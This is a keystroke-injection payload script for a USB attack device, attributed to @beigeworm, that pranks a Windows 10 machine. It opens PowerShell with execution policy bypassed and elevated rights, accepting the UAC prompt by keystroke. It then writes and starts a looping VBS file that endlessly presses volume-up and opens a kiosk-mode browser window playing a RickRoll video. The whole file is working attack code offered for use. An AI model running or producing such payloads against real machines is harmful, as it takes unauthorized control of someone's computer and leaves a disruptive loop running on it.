// =============================================================================
// Title: RickRoll with Max Volume Spam
// Author: @beigeworm | https://github.com/beigeworm
// Description: start a RickRoll with a .vbs that spams the Volume UP button.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================


// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(500);
type("powershell -NoP -NonI -Exec Bypass");
press("CONTROL SHIFT ENTER");
delay(2000);
press("ALT y");
delay(4000);


type("copy con volup.vbs");
press("ENTER");
type ("do");
press("ENTER");
type("Set WshShell = CreateObject(\"WScript.Shell\")");
press("ENTER");
type("WshShell.SendKeys(chr(&hAF))");
press("ENTER");
type("WScript.Sleep 10");
press("ENTER");
type("loop");
press("ENTER");
press("CTRL z");
press("ENTER");
type("start volup.vbs");
press("ENTER");
delay(1000);
type("exit");
press("ENTER");
delay(1000);
press("GUI r");
delay(1000);
type("msedge.exe --new-window -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ");
press("ENTER");
delay(3000);
press("f");
